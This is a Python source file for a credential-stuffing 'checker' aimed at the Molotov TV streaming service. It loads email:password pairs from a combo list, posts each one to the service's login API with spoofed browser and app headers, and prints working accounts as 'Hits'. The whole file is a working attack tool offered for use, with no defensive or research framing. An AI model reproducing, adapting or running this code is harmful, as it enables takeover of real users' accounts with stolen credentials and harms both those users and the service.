from dna.setup import * #importing the DNA library that is going to help you to make checkers 
import requests, threading, time
from colorama import Fore,Style
from multiprocessing import *

dna = DNA() #here we initialize the setup from DNA's library

class Checker:
    """The checker class !

    This is where all the fun begins.

    Think this as a capsule, creating all your app.
    """
    def __init__(self,checker_name):
        """This is where you initialise your checker, needs the name of your checker so it transform it into ascii

        Args:
            checker_name (str): name of your checker
        """
        dna.generate_title(f'{checker_name}') #printing you ascii TITLE
        dna.load_combos() #loading the combo.txt for you

        self.hits = 0
        self.fails = 0
        self.errors = 0
        self.retries = 0

        self.accounts = dna.accounts #gather the accounts from the setup that loaded the combo. It's from another class that's why you have to put the setup.accounts.
        
    def request(self,acc):
        """This is were you checker works. After seting everything 

        Args:
            acc (str): the account that the checker is going to send
        """
        self.email,self.password = acc.split(':')
        
        self.headers = {
            
            'content-type': 'application/json',
            'origin' : 'https://www.molotov.tv',
            'referer': 'https://www.molotov.tv/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
            "x-molotov-agent": '{"app_build":1,"app_id":"customer_area","api_version":8,"type":"desktop","os":"windows","manufacturer":"","model":"","brand":"","serial":"","features_supported":["parental_control_v3","allow_recurly"]}',
            "x-molotov-website": "customer_area"} 
            
        self.data = {"email": f"{self.email}", "password": f"{self.password}", "grant_type": "password"}
        try:
            with requests.post(f'https://fapi.molotov.tv/v3.1/auth/login',headers=self.headers, json= self.data) as r:
                
                if 'display_name' in r.text:
                    self.hits+=1
                    
                    print(Fore.LIGHTGREEN_EX+f'[*] Hit >> {acc}'+ Style.RESET_ALL) 
                    
                elif 'Vos identifiants sont incorrects. Veuillez réessayer.' in r.text:
                    self.fails+=1
                    
                    print(Fore.LIGHTRED_EX+f'[*] Fail >> {acc}'+ Style.RESET_ALL)
                else:
                    pass
                    #print(r.text)
        except requests.exceptions.ProxyError:
            pass

if __name__== '__main__' :
    print(Style.RESET_ALL+Fore.LIGHTCYAN_EX)
    
    c = Checker('bartaba')
    
    while dna.queue.qsize() > 0:
        
            c.request(dna.queue.get())
            

    print(Fore.LIGHTMAGENTA_EX+'> Completed !'+ Style.RESET_ALL)
